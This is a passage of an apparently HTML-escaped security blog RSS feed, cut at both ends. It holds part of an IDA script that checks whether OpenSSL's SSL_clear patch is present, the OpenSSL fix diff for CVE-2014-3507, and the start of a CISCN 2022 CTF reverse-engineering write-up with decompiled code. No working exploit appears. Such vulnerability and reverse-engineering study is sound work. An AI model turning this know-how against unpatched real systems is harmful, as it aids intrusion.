FindCode(inst,flags))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (target = Rfirst(inst);target != BADADDR;target = Rnext(inst,target))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  xref = XrefType();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(xref == fl_CN || xref == fl_CF)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   Message(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s calls %s from 0x%x\n&amp;quot;&lt;/span&gt;,name ,Name(target),inst);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(target == LocByName(&lt;span class=&#34;string&#34;&gt;&amp;quot;SSL_clear&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       Message(&lt;span class=&#34;string&#34;&gt;&amp;quot;this database hax beens patched!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;task2cve-2014-3507&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#task2cve-2014-3507&#34;&gt;#&lt;/a&gt; task2:CVE-2014-3507&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;--- a/ssl/d1_both.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+++ b/ssl/d1_both.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@@ &lt;span class=&#34;number&#34;&gt;-616&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;616&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; @@ dtls1_reassemble_fragment(SSL *s, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; hm_header_st* msg_hdr, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ok)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            msg_hdr-&amp;gt;msg_len &amp;gt; dtls1_max_handshake_message_len(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+       &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (frag_len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; DTLS1_HM_FRAGMENT_RETRY;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Try to find item in queue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(seq64be,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(seq64be));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        seq64be[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;] = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;) (msg_hdr-&amp;gt;seq&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@@ &lt;span class=&#34;number&#34;&gt;-693&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;696&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; @@ dtls1_reassemble_fragment(SSL *s, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; hm_header_st* msg_hdr, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ok)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-               pqueue_insert(s-&amp;gt;d1-&amp;gt;buffered_messages, item);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               item = pqueue_insert(s-&amp;gt;d1-&amp;gt;buffered_messages, item);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               &lt;span class=&#34;comment&#34;&gt;/* pqueue_insert fails iff a duplicate item is inserted.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * However, |item| cannot be a duplicate. If it were,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * |pqueue_find|, above, would have returned it and control&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * would never have reached this branch. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               OPENSSL_assert(item != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; DTLS1_HM_FRAGMENT_RETRY;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@@ &lt;span class=&#34;number&#34;&gt;-751&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;759&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; @@ dtls1_process_out_of_seq_message(SSL *s, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; hm_header_st* msg_hdr, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ok)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-               &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (frag_len &amp;amp;&amp;amp; frag_len &amp;lt; msg_hdr-&amp;gt;msg_len)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (frag_len &amp;lt; msg_hdr-&amp;gt;msg_len)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; dtls1_reassemble_fragment(s, msg_hdr, ok);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (frag_len &amp;gt; dtls1_max_handshake_message_len(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@@ &lt;span class=&#34;number&#34;&gt;-780&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;788&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; @@ dtls1_process_out_of_seq_message(SSL *s, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; hm_header_st* msg_hdr, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ok)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( item == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-               pqueue_insert(s-&amp;gt;d1-&amp;gt;buffered_messages, item);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               item = pqueue_insert(s-&amp;gt;d1-&amp;gt;buffered_messages, item);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               &lt;span class=&#34;comment&#34;&gt;/* pqueue_insert fails iff a duplicate item is inserted.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * However, |item| cannot be a duplicate. If it were,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * |pqueue_find|, above, would have returned it. Then, either&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * |frag_len| != |msg_hdr-&amp;gt;msg_len| in which case |item| is set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * to NULL and it will have been processed with&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * |dtls1_reassemble_fragment|, above, or the record will have&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;+                * been discarded. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+               OPENSSL_assert(item != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; DTLS1_HM_FRAGMENT_RETRY;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个相比较第一个就复杂一些，影响版本为小于 1.0.1&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/23/test/test/</guid>
            <title>test</title>
            <link>http://example.com/2022/06/23/test/test/</link>
            <pubDate>Thu, 23 Jun 2022 11:56:22 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;s&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;E:%5CmyBLOG%5Cblog%5Csource_posts%5Ctest%5C9%7DSY44NC03@1TZ%5BL3ICDSTV.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/21/ciscn-2022-whatheap/</guid>
            <title>ciscn_2022_whatheap</title>
            <link>http://example.com/2022/06/21/ciscn-2022-whatheap/</link>
            <pubDate>Tue, 21 Jun 2022 12:27:02 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/20/ciscn-2022-planecoode/</guid>
            <title>ciscn_2022_planecoode</title>
            <link>http://example.com/2022/06/20/ciscn-2022-planecoode/</link>
            <category>writeup</category>
            <pubDate>Mon, 20 Jun 2022 22:53:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn_2022-planecoode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn_2022-planecoode&#34;&gt;#&lt;/a&gt; CISCN_2022 planecoode&lt;/h1&gt;
&lt;p&gt;这个题目算是一个 llvm 的题目，对于我们输入的 code 进行解析操作，但是逆向的工程量很大，设计了很多 if,else 的模块，对应众多的操作。而且并不是说常规 vm 那种可以解析出常见汇编指令格式的操作码。而且使用了很多数据的转换操作，比如 BYTE1~BYTE5，HIBYTE,LOBYTE 等等，这些东西是我们必须回的东西。&lt;/p&gt;
&lt;p&gt;然后经过我长时间的解析，大概猜出来了流程，我们指定最开始的 xy, 这是边界限制，申请出来 8*x*y 字节的空间，然后对应的 (x,y) 的位置是一个 code,code 为 8 字节 64 位，储存在上述空间，然后开辟一个 x*y 大小的 stack，用来储存数据。&lt;/p&gt;
&lt;p&gt;下面的就是对于 code 解析处理，我们看到每次处理都是以 8 字节位单位，根据 x,y 来取指令，我们最简单的无疑是顺序取指。如何实现顺序取指？我们看看取指令的逻辑&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *vale; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  init_SIZE();                                  &lt;span class=&#34;comment&#34;&gt;// 确定XY的范围&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; = (__int64 **)init_map(size_X, size_Y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  set_code_data();                              &lt;span class=&#34;comment&#34;&gt;// 填入code数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_E91();                                    &lt;span class=&#34;comment&#34;&gt;// 选择初始位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_1583();                                   &lt;span class=&#34;comment&#34;&gt;// 模拟栈空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vale = (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)get_value_fromXY((__int64)&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;, size_X, size_Y, x_temp, y_temp);		&lt;span class=&#34;comment&#34;&gt;//根据xy来取指&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = operation(vale);                   &lt;span class=&#34;comment&#34;&gt;// 根据我们输入的code进行操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( result );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里是函数的主入口，我们重点关注取指令跟 x,y 的关系&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;get_value_fromXY&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; XN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; YN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 pos; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pos = get_pos(&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;, XN, YN, x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( pos )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = get_code(pos);					&lt;span class=&#34;comment&#34;&gt;//return *(_QWORD *)a1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;										&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 